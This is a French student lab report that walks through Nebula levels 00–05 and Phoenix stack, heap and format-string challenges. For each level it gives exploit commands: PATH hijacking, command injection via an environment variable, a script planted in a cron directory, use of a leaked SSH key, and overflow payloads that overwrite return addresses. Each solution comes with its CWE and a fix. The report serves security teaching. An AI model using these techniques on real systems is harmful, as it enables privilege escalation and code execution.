# tp1_secu

**Level00**
Nous devons donc traquer un programme en Set User ID. Pour cela, nous utilisons la commande find suivante :
level00@nebula:/bin/...$ find / -user flag00 2>/dev/null 

Parmi les occurrences trouvées, nous avons ceci :
/bin/.../flag00

Le chemin contenant ... est suspect et est utilisé ici pour cacher l’exécutable flag00.

Le programme change le UID effectif et permet d'exécuter un programme pour lequel on devrait pas avoir la permission (getflag)

La faiblesse est la présence d'un programme SUID non protégé.

CWE250:
The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.


**Level01**

Le programme appartient à l’utilisateur flag01 et est exécuté avec son UID effectif.
En analysant le code source, on remarque l’appel suivant :
system("/usr/bin/env echo and now what?");

Le programme utilise donc /usr/bin/env pour appeler echo, ce qui signifie que la résolution de la commande dépend de la variable d’environnement PATH (merci le hint).

Nous exploitons alors le fait que echo n’est pas appelé avec un chemin absolu, ce qui permet d’en fournir un autre via le PATH.
Nous créeons alors un symlink se nommant echo qui va pointé vers getflag:
level01@nebula:/tmp$ ln -s /bin/getflag /tmp/echo 

Ce lien permet de faire croire au programme qu’il exécute echo, alors qu’il exécute en réalité getflag, tout en conservant l’UID et le GID de flag01.

La dernière étape est de modifier la variable PATH afin que /tmp soit recherché en priorité  

level01@nebula:/tmp$ export PATH=/tmp:$PATH on rajoute tmp dans le path pour que echo ait accès à notre redirection.

La faiblesse est la fonction system() qui n'est pas indépendante du path et qui donc nous permet de lui faire exectuer ce qu'on veut

CWE-426:
The product searches for critical resources using an externally-supplied search path that can point to resources that are not under the product's direct control.

**Level02**

En analysant le code source, on remarque que la variable d’environnement USER est récupérée et directement intégrée dans une commande passée à system()

asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
system(buffer);

Nous pouvons alors faire ce que nous voulons avec la variable d'environnement USER. Nous injectons donc une commande "complétement aléatoire" avec ceci:
export USER='$(/bin/getflag)'
Ce qui récupère notre flag car le programme appartient à flag02.

La faiblesse ici est encore due à l'injection de paramètre dans  la fonction system() mais cette fois via une variable d'environnement.

CWE-77:
The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.

**Level03**

drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
Le cron appartient à flag03 donc tout ce qui est executé par lui à les droits de flag03.

on crée le fichier malveillant: echo "/bin/getflag" > malveillance_max.sh
il faut rediriger la sortie pour être sur que la sortie soit pas envoyé par mail ou quoi.
level03@nebula:/home/flag03/writable.d$ echo -e '#!/bin/bash\n/bin/getflag > /tmp/flag03.txt 2>&1' > malveillance_max.sh

**Level04**
/home/flag04$ ln -s /home/flag04/token /tmp/lien_pas_suspect crée le faux lien ne contenant pas le mot token
06508b5e-8909-4f38-b630-fdb148a848a2 est le token de flag04
en se connectant sur flag04 on peut alors rensigner le mdp
sh-4.2$ id uid=995(flag04) gid=995(flag04) groups=995(flag04) on est bien flag04 et donc on peut executer getflag

**Level05**
Un fichier caché backup est présent:
level05@nebula:/home/flag05$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile  .ssh
Il y'a une archive dedans
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz
qui contient plusieurs fichier dont le plus important 
id_rsa dans .ssh qui permet de se connecter en ssh
level05@nebula:/tmp$ ssh -i /tmp/.ssh/id_rsa flag05@localhost

et donc avoir le bon id pour effectuer getflag
flag05@nebula:/home$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
flag05@nebula:/home$ getflag
You have successfully executed getflag on a target account


# tp2_secu

**stack-zero**
Le programme lit une entrée utilisateur à l’aide de la fonction gets() dans un buffer de taille fixe situé sur la pile .
La fonction gets() ne vérifie pas la taille de l’entrée fournie. Il est donc possible d’écrire au-delà des 64 octets du buffer et d’écraser la variable changeme placée juste après sur la pile.

La solution consiste à fournir une entrée supérieure à 64 caractères afin de modifier la valeur de changeme : python3 -c 'print("A"*65)' | ./stack-zero


La faiblesse provient de l’utilisation de gets(), qui permet un dépassement de tampon sur la pile et la modification de variables adjacentes en mémoire.

Pour corriger ce problème, il faut remplacer gets() par une fonction limitant la taille de l’entrée, comme fgets().

CWE-121 :  A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).


**stack-one**

Le programme copie un argument fourni par l’utilisateur dans un buffer de taille fixe situé sur la pile.
Or la fonction strcpy() est utilisé sans vérificaiton de taille donc on peut écrire plus que 64 octets dans le buffer et écraser la variable changeme stockée juste après en mémoire.

L’objectif est de modifier changeme avec la valeur 0x496c5962.
En tenant compte du little endian, cette valeur doit être écrite octet par octet à l’envers.

La solution est donc la suivante:
./stack-one "$(python3 -c 'print("A"*64 + "bYlI")')" (en code ascii)

La faiblesse provient de l’utilisation de strcpy(), qui permet un dépassement de tampon sur la pile et la modification de variables adjacentes avec des valeurs contrôlées.

Pour corriger ce problème, il faut remplacer strcpy() par une fonction limitant la taille de la copie comme strncpy().

CWE-121 :  A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).


**stack-two**

Le programme copie le contenu d’une variable d’environnement dans un buffer de taille fixe situé sur la pile.
La fonction strcpy() est utilisée sans aucune vérification de taille sur le contenu de la variable d’environnement ExploitEducation.

La solution consiste à définir la variable d’environnement ExploitEducation avec une valeur suffisamment longue, suivie de la valeur cible étant 0x0d0a090a:
export ExploitEducation=$(python3 -c 'print("A"*64+"\x0a\x09\x0a\x0d")')

La faiblesse provient de l’utilisation de strcpy() combinée à une entrée utilisateur non contrôlée issue d’une variable d’environnement.

Pour corriger ce problème, il faut limiter la taille des données copiées dans le buffer en utilisant une fonction sécurisée comme strncpy().

CWE-121 :  A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).


**stack-tree**

Le programme lit une entrée utilisateur à l’aide de la fonction gets() dans un buffer de taille fixe situé sur la pile.
On peut alors écraser le pointeur de fonction fp.
L’objectif est de faire pointer fp vers la fonction complete_level().
L’adresse de cette fonction peut être récupérée à l’aide de objdump :
objdump -t /opt/phoenix/amd64/stack-three | grep complete_level

Lors des tests, l’utilisation de caractères dont la valeur ASCII est supérieure à 0x7f posait problème, car l’encodage UTF‑8 ajoute automatiquement un octet supplémentaire 0xc2. 
Il se trouve que ce caractère était situé à la fin donc on a pu juste enlever un A en passant de "A"*64 à "A"*63.

La solution consiste à fournir une entrée suffisamment longue pour atteindre le pointeur de fonction et y écrire l’adresse de complete_level() :
python3 -c 'print("A"*63 + "\x9d\x06\x40")' | ./stack-three

La faiblesse provient de l’utilisation de gets(), qui permet un dépassement de tampon sur la pile.

Pour corriger ce problème, il faut remplacer gets() par une fonction limitant la taille de l’entrée, comme fgets()

CWE-121 :  A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).


**format-zero**
Le programme lit une entrée utilisateur et l’utilise directement comme chaîne de format dans la fonction sprintf.

Dans ce cas, la chaîne fournie par l’utilisateur est interprétée comme une chaîne de format. Cela permet d’influencer le comportement de sprintf, notamment en écrivant au-delà du buffer dest.

La solution consiste à fournir une chaîne de format qui force l’écriture de plus de 32 caractères :
python3 -c 'print("%33x")' | ./format-zero

La faiblesse provient de l’utilisation de sprintf() avec une chaîne de format contrôlée par l’utilisateur.

Pour corriger ce problème, il faut utiliser une fonction limitant la taille de l’écriture comme snprintf().

CWE-134 : The product uses a function that accepts a format string as an argument, but the format string originates from an external source.

**format-one**

Le programme utilise une entrée utilisateur comme chaîne de format dans la fonction sprintf.

L’objectif est de modifier changeme avec la valeur 0x45764f6c.
La taille de l’entrée étant limitée à 15 caractères, il n’est pas possible d’utiliser directement des octets hexadécimaux. La valeur cible est donc reconstruite à l’aide de caractères ASCII.

La solution consiste donc à produire exactement 32 caractères, suivis de la chaîne correspondant à la valeur cible :
python3 -c 'print("%31x" + "," + "lOvE")' | ./format-one

La faiblesse provient de l’utilisation de sprintf() avec une chaîne de format contrôlée par l’utilisateur.

Pour corriger ce problème, il faut utiliser une fonction sécurisée comme snprintf().

CWE-134 : The product uses a function that accepts a format string as an argument, but the format string originates from an external source.


**heap-zero**

En analysant le code source, on observe l’utilisation de la fonction strcpy() pour copier l’argument passé en ligne de commande dans un buffer de taille fixe situé sur le heap.
Aucune vérification de taille n’est effectuée, ce qui permet un dépassement sur le tas lorsque l’argument dépasse 64 octets. Les structures sont allouées consécutivement donc le débordement peut écraser le pointeur de fonction f->fp entrainant un détournement du flot d'exécution lors de l'appel.

Pour corriger cette erreur on peut remplacer strcpy() en strncpy() qui vérifie la  taille de l'entrée avant sa la copie.

CWE-122 : A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().

**stack-four**
Le programme lit une entrée utilisateur à l’aide de la fonction gets() dans un buffer de taille fixe situé sur la pile :
La fonction gets() ne vérifie pas la taille de l’entrée fournie donc on peut écrire plus que 64 octets et donc écraser l'adresse de retour de start_level().

On réitère donc le même protocole à chaque fois (car on connait le code sourcce):

ensea@Security2:/opt/phoenix/amd64$ objdump -t /opt/phoenix/amd64/stack-four | grep complete_level
000000000040061d g     F .text	0000000000000018 complete_level

Donc ceci permet d'avoir la bonne adresse:

ensea@Security2:/opt/phoenix/amd64$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*88 + b"\x1d\x06\x40\x00\x00\x00\x00\x00")' | ./stack-four

La faiblesse provient donc de l’utilisation de gets(), qui permet un dépassement de tampon sur la pile et un détournement du flot d’exécution.

Pour corriger cette erreur, il faut remplacer gets() par une fonction limitant la taille de l’entrée, comme fgets()

CWE-121 :  A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).

**format-two**

Le programme utilise une entrée utilisateur qui est ensuite passée directement à la fonction printf : "printf(str);"
La variable globale changeme est stockée en mémoire à une adresse connue:
ensea@Security2:/opt/phoenix/amd64$ objdump -t /opt/phoenix/amd64/format-two | grep changeme
0000000000600af0 g     O .bss	0000000000000004 changeme
La faiblesse provient donc de l’utilisation de printf avec une chaîne contrôlée par l’utilisateur, ce qui ouvre la porte à une vulnérabilité de type format string et permet la modification de données en mémoire.

Pour corriger cette erreur, il faut utiliser une chaîne de format fixe lors de l’appel à printf comme ceci:
printf("%s", str);

CWE-134 : The product uses a function that accepts a format string as an argument, but the format string originates from an external source

